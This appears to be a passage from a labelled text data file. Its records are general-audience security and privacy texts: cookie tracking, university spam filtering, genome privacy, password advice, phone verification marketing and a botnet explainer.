the URL the browser will send upon form submission. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be appended as extra input that is neither part of the URL, nor of a cookie.\nThis approach presents two advantages from the point of view of the tracker: first, having the tracking information placed in the HTML source and POST input rather than in the URL means it will not be noticed by the average user; second, the session information is not copied when the user copies the URL (to save the page on disk or send it via email, for example).\nThis method can be easily used with any framework that supports web forms.\nThe downside is that every separate window or tab will initially have an empty window.name; in times of tabbed browsing this means that individually opened tabs (initiation by user) will not have a window name. Furthermore window.name can be used for tracking visitors across different websites, making it of concern for Internet privacy.\nIn some respects this can be more secure than cookies due to not involving the server, so it is not vulnerable to network cookie sniffing attacks. However if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab.\nHTTP authentication \nThe HTTP protocol includes the basic access authentication and the digest access authentication protocols, which allow access to a Web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.\nSee also \n- Dynamic HTML\n- Local Shared Object – Flash Cookies\n- Session Beans\n- Session (computer science)\n- Session ID\n- Web server session management\n- Web Storage and DOM Storage\n- Web visitor tracking\n- Zombie cookie\n- \"HTTP State Management Mechanism – Overview\". IETF. April 2011.\n- Penenberg, Adam; Cookie Monsters, Slate, November 7, 2005. \"Cookies are not software. They can't be programmed, can't carry viruses, and can't unleash malware to go wilding through your hard drive.\"\n- \"New net rules set to make cookies crumble\". BBC. 2011-03-08.\n- \"Sen. Rockefeller: Get Ready for a Real Do-Not-Track Bill for Online Advertising\". Adage.com. 2011-05-06.\n- Peng, Weihong; Cisna, Jennifer (2000). \"HTTP cookies - a promising technology\". Proquest. Online Information Review. Retrieved 29 March 2013.\n- Vamosi, Robert (2008-04-14). \"Gmail cookie stolen via Google Spreadsheets\".\n- Schwartz, John (2001-09-04). \"Giving Web a Memory Cost Its Users Privacy\". The New York Times.\n- Kesan, Jey; and Shah, Rajiv ; Deconstructing Code, SSRN.com, chapter II.B (Netscape's cookies), Yale Journal of Law and Technology, 6, 277–389\n- Kristol, David; HTTP Cookies: Standards, privacy, and politics, ACM Transactions on Internet Technology, 1(2), 151–198, 2001 doi:10.1145/502152.502153 (an expanded version is freely available at arXiv:cs/0105018v1 [cs.SE])\n- \"Press Release: Netscape Communications Offers New Network Navigator Free On The Internet\". Web.archive.org. Archived from the original on 2006-12-07. Retrieved 2010-05-22.\n- \"Usenet Post by Marc Andreessen: Here it is, world!\". Groups.google.com. 1994-10-13. Retrieved 2010-05-22.\n- Hardmeier, Sandi (2005-08-25). \"The history of Internet Explorer\". Microsoft. Retrieved 2009-01-04.\n- Jackson, T (1996-02-12). \"This Bug in Your PC is a Smart Cookie\". Financial Times.\n- \"Maintaining session state with cookies\". Microsoft Developer Network. Retrieved 22 October 2012.\n- Rouse, Margaret (September 2005). \"Transient cookie (session cookie)\". SearchSOA. TechTarget. Retrieved 22 October 2012.\n- OWASP Browsers Supporting HttpOnly\n- IETF HTTP State Management Mechanism – Apr, 2011 Obsoletes RFC 2965\n- Böttiger, Arvid (2011). \"HTTP-Only cookies - Brought to you by Internet Explorer 6\".\n- Mayer, Jonathan. \"Tracking the Trackers: Microsoft Advertising\". The Center for Internet and Society. Retrieved 28 September 2011.\n- Burt, David. \"Update on the issue of ‘supercookies’ used on MSN\". Retrieved 28 September 2011.\n- Jim Manico quoting Daniel Stenberg, Real world cookie length limits\n- \"Persistent client state HTTP cookies: Preliminary specification\". Netscape. c1999. Archived from the original on 2007-08-05.\n- RFC 2965 – HTTP State Management Mechanism (IETF)\n- \"Cookie Property\". MSDN. Microsoft. Retrieved 2009-01-04.\n- Shannon, Ross (2007-02-26). \"Cookies — set and retrieve information about your readers\". HTMLSource. Retrieved 2009-01-04.\n- Innovative, Php (2011-09-02). \"Sharing Cookies Between Multiple Domains\". InnovativePhp. Retrieved 2011-09-02.\n- RFC 2616 - Hypertext Transfer Protocol - HTTP/1.1\n- Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary) (PDF) XIII. Symantec Corp. April 2008. pp. 1–3. Retrieved May 11, 2008.\n- Whalen, David (June 8, 2002). \"The Unofficial Cookie FAQ v2.6\". Cookie Central. Retrieved 2009-01-04.\n- \"3rd-Party Cookies, DOM Storage and Privacy\". grack.com: Matt Mastracci's blog. January 6, 2010. Retrieved 2010-09-20.\n- \"How to Manage Cookies in Internet Explorer 6\". Microsoft. December 18, 2007. Retrieved 2009-01-04.\n- \"Clearing private data\". Firefox Support Knowledge base. Mozilla. 16 September 2008. Retrieved 2009-01-04.\n- \"Clear Personal Information : Clear browsing data\". Google Chrome Help. Google. Retrieved 2009-01-04.\n- \"Clear Personal Information: Delete cookies\". Google Chrome Help. Google. Retrieved 2009-01-04.\n- \"Site Compatibility for Firefox 22\", Mozilla Developer Network, 2013-04-11\n- Miyazaki, Anthony D. (2008), “Online Privacy and the Disclosure of Cookie Use: Effects on Consumer Trust and Anticipated Patronage,” Journal of Public Policy & Marketing, 23 (Spring), 19–33\n- \"CIA Caught Sneaking Cookies\". CBS News. 2002-03-20.\n- \"Spy Agency Removes Illegal Tracking Files\". The New York Times. 2005-12-29.\n- \"EU Cookie Directive - Directive 2009/136/EC\". JISC Legal Information. Retrieved 31 October 2012.\n- Privacy and Electronic Communications Regulations. Information Commissioner's Office. 2012.\n- Directive 95/46/EC of the European Parliament and of the Council of 24 October 1995 on the protection of individuals with regard to the processing of personal data and on the free movement of such data. 1995-11-23. pp. P. 0031–0050. Retrieved 31 October 2012.\n- \"New EU cookie law (e-Privacy Directive)\". Retrieved 31 October 2012.\n- \"EU cookie law: stop whining and just get on with it\". Retrieved 31 October 2012.\n- \"A Loophole Big Enough for a Cookie to Fit Through\". Bits. The New York Times. Retrieved 31 January 2013.\n- Pegoraro, Rob (July 17, 2005). \"How to Block Tracking Cookies\". Washington Post. p. F07. Retrieved 2009-01-04.\n- Wired Hack Obtains 9 Bogus Certificates for Prominent Websites\n- Fielding, Roy (2000). \"Fielding Dissertation: CHAPTER 6: Experience and Evaluation\". Retrieved 2010-10-14.\n- Tilkov, Stefan (July 2, 2008). \"REST Anti-Patterns\". InfoQ. Retrieved 2009-01-04.\n- Mena, Jesús (2011). Machine Learning Forensics for Law Enforcement, Security, and Intelligence. Boca Raton, FL: CRC Press (Taylor & Francis Group). ISBN 9-781-4398-6069-4.\n- \"ThomasFrank.se\". ThomasFrank.se. Retrieved 2010-05-22.\n- RFC 6265 – the official specification for HTTP cookies\n- HTTP cookies - Mozilla Developer Network\n- Using cookies via ECMAScript - Mozilla Developer Network\n- How Internet Cookies Work at HowStuffWorks\n- Information About Cookies from Microsoft\n- Cookies at the Electronic Privacy Information Center (EPIC)\n- Taking the Byte Out of Cookies: Privacy, Consent, and the Web (PDF)\n- Web handbook – Cookies from Delivery And Transformation Group, Cabinet Office, UK\n- Cookie-Based Counting Overstates Size of Web Site Audiences at ComScore\n- Don’t Tread on Our Cookies – The Web Privacy Manifesto at PBS\n- Mozilla Knowledge-Base: Cookies\n- AVG Blogs: What are Cookies", "label": 1}
{"text": "- Safety and Security\n- Network and Phone\n- Mobile Devices\nBlocking E-mail Spam\nNetwork Engineering uses several tools to help keep spam from reaching your mailbox. Read on for more information about what we are doing to prevent spam, what you can do, and how to keep your address off of spammers' lists.\nWhat is Spam?\nSpam is defined as unsolicited, bulk e-mail. Typically spam comes from strangers - people who have obtained your e-mail address without your permission. If you signed up for the mailing (intentionally or accidentally), it may be undesirable e-mail, but it is not technically spam. Likewise, if you have some sort of business relationship with the sender, it is not spam. So, an e-mail sent to you from your bank, an online service you signed up for, or your department at OSU would not be considered spam.\nNote: Using OSU's e-mail system to send unauthorized bulk mailings is against the Acceptable Use Policy. For information about how to do a bulk mailing at OSU correctly, please see the Guidelines for Release of E-mail Addresses.\nStep 1 - Using Filtering On Your Account\nStep 2 - Reporting Spam\nIf Step 1 doesn't stop the spam from coming through, you can report the spam to OSU Network Engineering:\nGreylisting works by sending a temporary failure message on the first attempt of a unique combination of sender IP, sender and recipient. Legitimate, properly-configured mail servers deal with a temporary failure by queuing the message and resending later (typically within 15 to 30 minutes). On subsequent attempts to send a message, the greylisting server allows the message to be delivered.\nGreylisting works as an effective method to prevent spam because spammers typically do not bother to queue mail. Rather they blast the spam out once and ignore delivery failures.\nThe downside of greylisting is that it may cause a legitimate message to be delayed. Messages may also appear to arrive out of order, as subsequent messages from the same sender are not delayed. Also some sites do not queue and redeliver messages properly.\nOSU addresses these issues by building up a comprehensive whitelist of allowed senders. If there are sites that you are concerned about, please send us a list at net (at) oregonstate.edu, and we will add them to the whitelist.\nNOTE: Greylisting does not apply to e-mail sent within OSU.\nReal-Time Black Hole Lists (RBLs)\nA RBL is a list of hosts that are known untrustworthy e-mail senders. When we receive email from one of these sites, we bounce the message back to the site with an explanation that they are in an RBL and a link with directions on how to get unlisted from it. In addition to RBLs, we have an access list of domain names and email addresses of known spammers that we reject mail from. We also block mail from dynamic IP ranges, because mail servers should never have a dynamic IP. Finally, we block mail from dialup users and cable modem users - these users must relay through their ISP's mail server (or they can relay through OSU with ONID authentication).\nWe use the following RBLs at OSU\n- Spamhaus.org PBL (pbl.spamhaus.org)\n- Spamhaus.org SBL (sbl.spamhaus.org)\n- Spamhaus.org XBL (xbl.spamhaus.org)\n- Dynablock (dynablock.njabl.org)\n- NJABL.ORG (dnsbl.njabl.org)\n- VIRBL - virus black list(virbl.dnsbl.bit.nl)\nIf you are having trouble receiving mail from another site because they are listed in one of our RBLs, please tell the person at the remote location to contact their e-mail administrator or ISP and give them the information in the bounce message that they received from OSU. Contact us at net(at)oregonstate.edu if the sending site is unable or unwilling to get unlisted - we may be able to help them get unlisted, or whitelist the site here.\nFor more information about phishing, please see the Phishing helpdoc page.\nOSU blocks e-mail messages that contain a reply-to address that goes to a known phisher. If practical, we will also \"poison DNS\" for links included in phishing e-mails, so that clicking the link will redirect you to a safe page instead.\nIf you respond in any way to a phishing e-mail that asks for your username and password, we will disable your account and ask you to reset your password. OSU has had several accounts become hacked in the past and these hacked accounts have been used to send hundreds of thousands of spam e-mails to OSU and to the world, causing serious e-mail disruption.\nNEVER respond to phishing e-mails!\nContent-Based Filtering & SpamAssassin\nContent-based filtering refers to sorting or deleting mail based on the content of the message itself. We do content-based tagging at the mail relays using SpamAssassin, and these tags can be used to filter spam in your e-mail client.\nMany e-mail clients now come with \"Junk Mail\" filters built-in, which you can turn on to help sort out the messages you don't want to see. When you use a junk mail filter, make sure that you set it to sort the unwanted mail into a junk folder, rather than your deleted items. That way, you can check the junk folder once in a while to make sure that no innocent e-mails have ended up there.\nSpamAssassin headers that you can filter on:\nX-Spam-Flag: YES (indicates that this message has a score of 5 or more)\nX-Spam-Level: ******** (the number of stars indicates the spam score)\nFor example, to filter all messages with a score of 3 or higher, you could create a rule in your email client to match on \"X-Spam-Level: ***\".\nHow to Keep Your E-mail Address Off Spam Lists\nThe best way to avoid being spammed is to be careful how you share your e-mail address. Every time that you sign up for something online and provide your e-mail address to do so, you are potentially sharing your contact information with not only that site, but with third parties as well.\nThe following are things you can do to keep your address off spammers' lists:\n- Don't sign up for work-at-home or other too-good-to-be-true offers; they are typically scams and your contact information will definitely go to spammers.\n- NEVER reply to spam or phishing emails. If you do, it verifies to the spammer that your address is a real working address and that makes it even more valuable to them (and makes it more likely that you will get more spam).\n- If you post your e-mail address on a publicly accesible website, try to obscure it in some way (e.g. bob(at)oregonstate.edu).\n- When signing up for various accounts online, uncheck the boxes that ask about putting you on their mailing list. Typically these will be checked by default.\nOSU Email Statistics\nWhere does spam come from?\nIn the past, most spam came from misconfigured mail servers or proxy servers. But today most spam comes from virus-infected personal computers, hacked e-mail accounts and free e-mail providers. See the Wikipedia article on Spam for more information about how spammers operate.\nOne very important thing that you can do in the fight against spam is to keep your computer up-to-date on software patches and anti-virus software. It's also a good idea to run a personal firewall. Use caution when opening e-mails from addresses you don't recognize, and always scan email attachments for viruses. If your computer has become noticeably slower, it's a good idea to run virus-detection software.\nFinally: NEVER share your password!", "label": 1}
{"text": "Shots - Health Blog\nThu October 11, 2012\nBioethicists Call For Privacy Protections For Personal Genomes\nWhen a stranger can gain access to someone's entire genetic code by picking up a used coffee cup, it presents a whole new thicket of concerns about privacy and security.\nActually, we're already there, though we're still in the early stages of what's shaping up, after all the years of hype, as a genuine revolution. Just take a look at Rob Stein's recent series on the $1,000 genome to see how far we've come and where we're headed.\nA sample of saliva taken from a coffee cup or a Q-tip is enough for technicians to reveal someone's genes, for better and for worse. Reuters' Sharon Begley points to EasyDNA, a California company, that's already doing ancestry, health and paternity testing on samples ranging from cigarette butts to licked stamps.\nAgainst that backdrop, the Presidential Commission for the Study of Bioethical Issues just released recommendations on how the country should proceed along the genomic path.\nYes, whole genome sequencing may help refine diagnosis and treatment, though there are still plenty of technical and medical hurdles to overcome before that's commonplace.\nBetween now and then, safeguards are needed before whole genome sequencing becomes widespread, the commission says. In a letter to President Obama, the commission chairs say the group, \"recommends strong baseline protections for whole genome sequence data to protect individual privacy and data security while also leaving ample room for data sharing opportunities that propel scientific and medical progress.\"\nSome specific ideas from the commission:\n- Federal and state governments should establish a \"floor of privacy protections covering whole genome sequence data regardless of how they were obtained.\"\n- Prohibit unauthorized whole genome sequencing without the consent of the person whose sample is being analyzed. (Hands off my coffee cup!)\n- The people who sequence your genome need to tell you up front that it's likely there will be potentially worrisome \"incidental findings\" in the results.\nSo-called incidentalomas are quite common when radiologists scan patients. Since everyone has genetic mutations, the whole genome sequences are bound to find something quirky on everyone. When obtaining your consent, the researchers, doctors or commercial genome sequencers need to explain when and how they'll tell you about those findings.", "label": 1}
{"text": "Damian Dovarganes/Associated Press\nDamian Dovarganes/Associated Press\nNEW YORK – Rarely does a week go by without news of another hacking incident, whether it’s Chinese hackers accused of breaking in to The New York Times’ computer systems or Burger King finding its Twitter account taken over by pranksters.\nSecurity threats aren’t new and have long been part of online life. But the increased attention on them makes now a good time to review ways you can protect yourself. If nothing here feels new, that’s good, as it means you’ve been doing the things you need to do to keep your accounts safe from hackers. Although there’s no way to completely eliminate threats, minimizing them will go a long way.\nOne of the best things you can do is to make sure your password is strong.\nIf someone’s able to guess the password to your email or Facebook account, that person can post or send embarrassing things on your behalf. Someone was able to access Burger King’s Twitter account recently and changed its profile picture to a McDonald’s logo. If a banking or Amazon account is involved, someone could pay bills or buy iPads under your name – with your money.\nWhat’s worse, getting a password to one account is often a stepping stone to a more serious breach. Someone can use your email or Facebook account to send spam and scam messages to your friends, for instance. And because many services let you reset your password by sending an email to your address on file, someone with access to your email account can reset passwords and gain access to all sorts of things. If the compromised password is one you use for work, someone can snoop around for files on your employer’s network with trade secrets or customers’ credit card numbers.\nHere are ways you can keep your password strong to ward off that initial intrusion:\nMake your password long. The recommended minimum is eight characters, but 14 is better and 25 is even better than that. Some services have character limits on passwords, though.\nUse combinations of letters and numbers, upper and lower case and symbols such as the exclamation mark. Some services won’t let you do all of that, but try to vary it as much as you can. “PaSsWoRd!43” is far better than “password43.”\nAvoid words that are in dictionaries, even if you add numbers and symbols. There are programs that can crack passwords by going through databases of known words. One trick is to add numbers in the middle of a word – as in “pas123swor456d” instead of “password123456.” Another is to think of a sentence and use just the first letter of each word – as in “tqbfjotld” for “the quick brown fox jumps over the lazy dog.”\nSubstitute characters. For instance, use the number 0 instead of the letter O, or replace the S with a dollar sign.\nAvoid easy-to-guess words, even if they aren’t in the dictionary. You shouldn’t use your name, company name or hometown, for instance. Avoid pets and relatives’ names, too. Likewise, avoid things that can be looked up, such as your birthday or ZIP code. But you might use that as part of a complex password. Try reversing your ZIP code or phone number and insert that into a string of letters. As a reminder, you should also avoid “password” as the password, or consecutive keys on the keyboard, such as “1234” or “qwerty.”\nNever reuse passwords on other accounts – with two exceptions. Over the years, I’ve managed to create hundreds of accounts. Many are for one-time use, such as when a newspaper website requires me to register to read the full story. It’s OK to use simple passwords and repeat them in those types of situations, as long as the password isn’t unlocking features that involve credit cards or posting on a message board. That will let you focus on keeping passwords to the more essential accounts strong.\nThe other exception is to log in using a centralized sign-on service such as Facebook Connect. Hulu, for instance, gives you the option of using your Facebook username and password instead of creating a separate one for the video site. This technically isn’t reusing your password, but a matter of Hulu borrowing the log-in system Facebook already has in place. The account information isn’t stored with Hulu. Facebook merely tells Hulu’s computers that it’s you. Of course, if you do this, it’s even more important to keep your Facebook password secure.\nHow do you keep track of these passwords? There are programs you can buy, if you’re willing to put your trust in them. I use an Excel spreadsheet, but I encrypt it with its own password – a rather complex one. I am well aware that if the file gets compromised, all my services go with it. In fact, I once had it on a USB drive, which I had in a backpack that got stolen. I had to spend several hours changing passwords on all my accounts, just in case someone managed to break the password to that file. As a precaution, don’t name that file “passwords.” Name it something generic and boring.\nIdeally, you’ll have a system for creating and remembering passwords without needing the spreadsheet. For example, you might have a string that’s constant, such as “?t7q1b9f8j2o0t0l1d!” (the acronym for “the quick brown fox jumps over the lazy dog” with my area code and ZIP code reversed and a few special characters put in). To vary it, you could add the first two letters of the website you are using to the front and the next four to the end. Or put the consonants in front and the vowels at the end, with every other letter capitalized and the letter O replaced with the number 0. So for Amazon, it would be “mZn?t7q1b9f8j2o 0t0l1d!Aa0.” Just try to guess that!\nOf course, I’m not smart enough to have a system like that for myself.\nWhatever system you adopt, it’s good to change your password – and system – from time to time. And if there’s reason to believe your password might have been compromised, change it immediately.\nOne other thing to be aware of: Many sites let you reset your password by answering a security question, such as the name of your pet or the name of your high school. Of course, these violate good password practices by requiring you to use something that can be easily looked up. Others ask for your favorite movie or hobby. That might not be easily looked up, but your tastes change over time. Furthermore, because these questions get repeated from site to site, the answers you use violate the rule against repeating passwords.\nI try to make these answers complex just like passwords, by adding numbers and special characters and making up responses. Unfortunately, some sites won’t let you do that, and you’ll be stopped if you try to enter a numeral when asked for a city name, for instance. These services will often send an email when a password gets reset this way, so be sure the address on file is current. Change your password and security questions immediately if you’re notified of a reset you didn’t initiate. You might want to contact the service as well.\nWhile you’re at it, make your username complex, too, if you’re allowed to choose one. Banking sites typically do.\nBeyond passwords, here are a few other things to help you stay safe:\nSoftware flaws. Many break-ins result from flaws in the software program you use, whether it’s the Windows or Mac operating system, a Web browser or a video player. It’s a good idea to let those programs automatically check for software updates, as those updates may contain fixes to known flaws. You can also check this government website to learn of the latest threats and fixes: http://us-cert.gov .\nMalicious software. Even if the software you’re using is flawless, hackers may create a security opening by tricking you into installing a malicious program. That can happen if you click on a bad email attachment or link in your email. In rare cases, visiting a problematic website can cause the software to download. Should malicious software get on your computer, a hacker might be able to use the opening to look around for sensitive data, or record your keystrokes to capture your complex passwords. To minimize the threat, use caution when visiting unknown sites or opening mysterious email.\nSecurity software. Many companies sell anti-virus and other software to protect your computer from malicious software. There’s a free one available at http://www.avg.com . Windows and Mac computers also come with firewalls to block some threats. Be sure it’s turned on.", "label": 1}
{"text": "Password Policy Guidelines\nThis document introduces the basic concepts of network authentication. In particular, it focuses on the use of login IDs and passwords to verify the identity of users. Various strategies for selecting strong, hard-to-guess passwords are then discussed.\nThe Role of Passwords in Authentication\nMost shared computer systems limit access to data and resources, based on the identity of users who request that access. Access control is therefore dependent on reliable user identification.\nAuthentication is the process of identifying users in a manner which makes it difficult for one user to impersonate another.\nA number of technologies are available for user authentication. The most popular authentication systems are:\n- Secret passwords.\n- Cryptographic certificates.\n- Smart cards.\n- Biometric devices (fingerprints, retina scans, head scans, etc.).\nSince they are the least expensive to implement, most systems rely on passwords to authenticate users. As well, passwords are often used in addition to physical or cryptographic proofs of identity to further strengthen security.\nThreats to Password Security\nA typical case involves a malicious user (M) trying to access a network resource for which M is not authorized. One of the easiest ways for M to access that network resource is to guess the password of a valid user (V).\nThere are several methods that M could use to guess V's password. First, M could use a computer program to try out possible values for V's password very quickly. M could also acquire V's password by watching as V enters it. M could literally watch V typing, or could use electronic means, such as installing software on V's computer to record his keystrokes, or installing a network analyzer to monitor V's keystrokes as they are transmitted over the network.\nMaking Passwords Hard to Guess\nThe responsibility of selecting a password that is hard to guess generally falls to users, like V.\nIf users choose a one-character password, and that character could be any uppercase letter, lowercase letter or digit, then there would be 62 possible passwords. Clearly, M could try all 62 possibilities very quickly.\nV could make his/her password harder to guess by using more characters. Using the same possible characters, there are 3844 possible two-character passwords, and 218340105584896 (about 218 trillion) 8-character passwords.\nEven if M could try out 5000 eight-character passwords per second, it would take, on average, 700 years for M to guess V's 8-character password. Clearly, longer passwords are more secure!\nUnfortunately, V might choose a long password based on something he knows - like his login ID, name or some dictionary word. If V does this, then instead of trying 218 trillion passwords, M could probably guess V's password after a few thousand attempts. If M uses a computer program to guess passwords, this will only take a few minutes.\nTo decrease the chances of M ever guessing his/her password, V must select a hard-to-guess, or strong password. A strong password must:\n- Be as long as possible (never shorter than 6 characters).\n- Include mixed-case letters, if possible.\n- Include digits and punctuation marks, if possible.\n- Not be based on any personal information.\n- Not be based on any dictionary word, in any language.\nWhile most shared systems can enforce at least some of these rules, almost none have features to enforce all of them.\nNo matter how many strength rules V uses, though, the persistent M will eventually guess V's password - given enough time. Thus, V must also:\n- Change his password regularly, in order to limit the amount of time available to M to guess it.\n- Never use the same password twice.\nSome systems have a password expiry feature, which forces V to change his password periodically.\nAs well, some systems incorporate a password history feature, which disallows V from reusing one of his last N passwords.\nWhen faced with a password history mechanism, some users may change their password N times, and return it to its original value, so as to avoid having to remember a new password value. To prevent this, systems should either have an unlimited-length password history, or prevent users from changing their password more than once daily.\nMaking Passwords Hard to Intercept\nWhen a user enters his/her password, it might be intercepted at his/her workstation (by a keyboard monitor program), on the network (by a packet sniffer program), or on the server he is accessing (by a Trojan Horse program).\nTo protect the user's workstation, a strong operating system must be installed, such as Unix or Windows NT. Furthermore, the workstation must be physically secured against tampering.\nIf an operating system without security features is used (such as DOS, Windows or MacOS), then an intruder only needs temporary physical access to the console to insert a keyboard monitor program. If the workstation is not physically secured, then an intruder can reboot even a secure operating system, restart the workstation from his own media, and insert the offending program.\nTo protect against network analysis attacks, both the workstation and server should be cryptographically secured. Examples of strong protocols are the encrypted Netware login and Kerberos. Some systems (like the Windows NT file server protocol -- SMB or CIFS) make an attempt at cryptography, but are easily defeated by cryptanalysis. Systems that make no effort to encrypt remote access sessions, such as mainframes and Unix hosts, can be trivially compromised by a network analyzer.\nFinally, to protect against Trojan Horse login programs, the server should be physically secured, closely monitored, and should automatically log off unattended sessions.", "label": 1}
{"text": "Consumers and companies today rely on the Internet to perform all manner of tasks, from conducting business, to buying and selling personal items to managing their lives, friendships and family interactions. However, working and living online exposes everyone to successive waves of hacks, scams, and other digital exploits – threats unimagined only a few years ago.\nEnterprise IT and corporate management are spending increasing time, energy, and funds on securing digital and physical assets with technology of growing complexity. Strong encryption, multifactor biometrics, intrusion detection, anti-malware software and other advanced security measures provide necessary protection against a range of threats, but a simple truth remains: Verification before a transaction (or a security breach) occurs is always cheaper and more effective than attempting to remedy the consequences of failing to do so.\nInternet security today is built on a fragile combination of robust transport authentication mechanisms like SSL and SSH, strong public and private key encryption, and password and CAPTCHA regimes. Unfortunately, encryption and transport security do little to address vulnerabilities at the endpoints — servers and the personal devices used to access them. And, authentication solutions such as passwords, CAPTCHA and tokens have been shown to be vulnerable to attack.\nIntelligent authentication via the phone\nMobile phones are today the most ubiquitous devices on earth. In 2011, the United Nations estimates that more than five billion people worldwide own mobile phones and subscribe to voice and messaging plans and other services. Complement that number with 1.2 billion landlines and a growing number of Internet (VoIP) phones for majority coverage of today’s global population of nearly 7 billion people.\nMobile phones and landlines present key advantages for verification and authentication regimes:\nPhoneID provides detailed information about phone type and registration location information globally. Scammers and fraudsters often rely on untraceable pre-paid phones or VoIP numbers that they can acquire in bulk to spam and scam online users. PhoneID helps companies identify such anonymous, location-independent telephone numbers, and block or flag these users and their associated transactions.\nTelephone Verification entails using a supplied telephone number for one-time authentication of online user identity. It calls or sends a text to the user supplied phone number with a PIN that gives users the opportunity to verify their identity in establishing an account or even for each login to the account. Combined with PhoneID, telephone verification forms a robust out-of-band authentication method.\nFor example, Name.com, an accredited domain registrar and web hosting company, has a multi-layered fraud defense strategy, using telephone verification together with other fraud prevention products to eliminate more than $1.5 million in annual online fraud.\nDomain registrars are frequently targeted by fraudsters, as compromised domain names are easy gateways for scamming customers of banks, cloud services companies, e-commerce and other websites. By stealing and redirecting domain names, fraudsters can intercept traffic and spoof websites to “phish” for credentials, compromise user accounts, and siphon off funds and personal data. In recent years, Name.com experienced 10 to 12 percent annual fraud rates. By employing fraud prevention solutions to flag suspicious orders and create audit trails with intelligent authentication, Name.com reduced the time and manpower needed to identify fraudulent orders and cut illegal domain purchases by 97 percent.\nPhone verification/identification is fast becoming a core security solution for online companies. It’s used by organizations of all sizes including some of the world’s largest and most prominent Web businesses. It’s also in use by in multiple industries such as social media, lead generation, classifieds, financial services, healthcare, eCommerce and cloud-based services.\nVerification is not merely a piece of larger security routines. Verification lets users, employers, and vendors build and leverage online reputation for applications that include:\nIn short, verification is key to securing online activities where knowing who is attempting to access digital assets is as important as what that person is doing.\nBenefits for Solutions Providers\nBy offering telephone verification along with other complementary security products, solutions providers can reap many benefits. They include:\n- Protecting The Business From Cloud Application Security Risks\n- The Massive SaaS Opportunities For VARs\n- A Reseller's Guide: Recipe For Channel Partnership Success\n- Cloud Connection: Seven Steps To Effective Public Cloud Services\n- From CapEx To OpEx: Channel Strategy In The Federal Push To The Cloud\n- A Reseller's Guide: Coming Out On Top In The Face Of Channel Conflict\n- How To Create A Case For Disaster Recovery Plan\n- How To Offset Your Customers' BYOD Risks\n- How To Ease Client Anxiety About Private Cloud Deployments\n- How An SMB Cloud Provider Can Create 'Swagger' In A Competitive Market\n- A Reseller's Guide: Creating A Successful Solution Provider Event\n- How to Prepare for the Future of the IT Solutions Industry\n- How to Consolidate Data Protection Services for Greater Customer Value\n- 10 Attributes to Support Revenue Marketing and Sales Success.\n- How To Improve Efficiency: Upgrade Mountain Lion and iOS6\n- How To Cash In On the Cloud Through Collaboration\n- How To Sell Cloud Storage In Five Steps\n- How To Protect High-Value Data Assets\n- Moving Data to the Cloud: Options for SMBs and Small Enterprises\n- How To Apply Big Data Security Analytics to Detect Advanced Threats and Breaches", "label": 1}
{"text": "Understanding Hidden Threats: Botnets\nYou've most likely heard of botnets. Still, even with all of the references to them in the news these days, it's not easy to gain a clear understanding of what they are, and how they might be affecting you. We've taken a few of the most common questions sent in by Lavasoft News readers, and answered them in plain and simple terms. Keep reading to set the facts on botnets straight.\nWhat is a botnet?\nA botnet is a network of compromised, or infected, computers that hackers have commandeered. PCs that are part of a botnet are often referred to simply as \"bots\".\nBotnets are part of the multilayered and profitable crimeware industry, where the initial step is to infect and take control of a targeted computer. PCs in a botnet are under the remote command and control of hackers. As part of that, hackers can take advantage of all of the resources on a machine (from personal information to bandwidth), and use it to perform malicious tasks under remote direction - all to carry out their criminal intentions.\nWhat is a zombie computer?\nA zombie computer is a system that has been infected and taken over remotely by cyber criminals. A collection of zombie computers makes up a botnet.\nWhat are botnets used for?\nBotnets are controlled remotely by hackers to distribute spam, viruses, and theft schemes - and to hijack additional computers. The main motivation behind botnets, in recent years, is for monetary gain by cyber criminals. Once compromised, cyber criminals have complete access to the infected machine; they are able to load software onto it, or pull information off of it.\nBot herders, the hackers who control botnets, can instruct thousands of computers to follow their orders, whether it's to propagate spam messages, launch fraud schemes or to issue denial of service attacks, targeting certain, often high-profile, websites in order to make them unavailable to users. Once bot herders compile a group of compromised machines, they can sell it to fraudsters who are then capable of using the exploited machines for identity and data theft.\nHow do I know if my computer is part of a botnet?\nMost owners of compromised PC are unwitting victims, never realizing that they have allowed unauthorized access to their computers. Machines are infected without the knowledge of the computer user; usually access to the system is gained through a virus, worm, or Trojan. The symptoms of infection are generally very subtle and are not immediately apparent to the average computer user without using special tools. Still, there are telltale signs and symptoms which may indicate a problem.\n- A slow computer\nThe most apparent sign, according to the analysts as Lavasoft Malware Labs, is \"slow computer\" syndrome: your Internet connection becomes strangely sluggish, or your PC gets slower as you run a few programs on it simultaneously. (However, users should note that this can also be caused by other types of malware, as well as other PC problems.)\n- Accused of sending spam\nBeing accused of sending spam is a sign that your system is infected and is part of a spam bot.\n- Detecting malware responsible for bots\nBy running an anti-spyware and anti-virus program, the security software will be able to root out an infection and classify it as a bot.\n- An unknown or suspicious process is running in the background on your PC\nIf you use a firewall to monitor network traffic, the program will allow you to spot suspicious traffic on your PC.\nFor more technically-oriented computer users, bot activity can be discovered through packet sniffer tools and knowledge about different protocols, ports, Windows Registry, processes and TCP/IP. This includes:\n- Large amounts of network traffic\nBots often connect to remove servers; they may use a questionable amount of bandwidth and cause network traffic even if you are not online.\n- IRC Traffic\nInternet Relay Chat (IRC) is a type of real-time Internet messaging, designed mainly for group discussion forums. IRC bots connect to IRC as a client, performing automated functions but appearing to be another IRC user.\n- SMTP Traffic\nSimple Mail Transfer Protocol (SMTP) is an Internet standard for e-mail across IP networks. Bots may use a built-in SMTP-engine to send spam to other users.\n- Open Ports\nOpen ports allows applications to multitask and use different protocols at the same time. All computer devices on a network need a channel to allow them to communicate with each other. Bots may search for open ports to be able to start a synchronization or communication.\nTo learn more about the specific steps you should be taking to prevent your system from becoming part of a botnet, read our next article, How To Guide: Preventing Bot Infections.", "label": 1}
